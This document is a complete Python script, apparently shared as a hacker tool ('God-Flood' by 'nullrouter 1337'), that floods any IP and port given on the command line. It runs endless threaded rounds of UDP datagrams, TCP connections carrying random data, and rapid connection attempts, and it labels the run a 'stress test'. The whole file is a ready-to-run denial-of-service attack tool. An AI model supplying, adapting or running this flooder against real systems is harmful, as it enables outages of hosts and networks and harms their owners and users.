#!/usr/bin/env python3
# God-Flood(tcp,syn,udp) by nullrouter 1337 (Python 3 Fixed)
import threading
import sys
import time
import random
import socket

if len(sys.argv) < 4:
    print("nullroute by nullrouter 1337")
    sys.exit("Usage: python3 " + sys.argv[0] + " <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        threading.Thread.__init__(self)
        
    def run(self):
        for i in range(self.packets):
            try:
                # Re-create socket inside loop for multiple connection attempts
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((self.ip, self.port))
                s.close()
            except Exception:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        threading.Thread.__init__(self)
        
    def run(self):
        for i in range(self.packets):
            try:
                # TCP requires a fresh connection or persistent stream
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((self.ip, self.port))
                data = random._urandom(self.size)
                s.sendall(data)
                s.close()
            except Exception:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
        
    def run(self):
        for i in range(self.packets):
            try:
                data = random._urandom(self.size)
                target_port = self.port
                if target_port == 0:
                    target_port = random.randrange(1, 65535)
                self.udp.sendto(data, (self.ip, target_port))
            except Exception:
                pass

# Safety check for UDP payload size limit
if size > 65507:
    sys.exit("Invalid packet size! Maximum for UDP is 65507.")

print(f"Starting stress test on {ip}:{port}...")

while True:
    try:
        u = udp(ip, port, size, packets)
        t = tcp(ip, port, size, packets)
        s = syn(ip, port, packets)
        
        u.start()
        t.start()
        s.start()
        
        # Throttles thread creation so your local machine doesn't crash
        u.join()
        t.join()
        s.join()
        
    except KeyboardInterrupt:
        print("\nStopping Flood!")
        sys.exit()
    except socket.error:
        print("Socket error occurred")
        sys.exit()
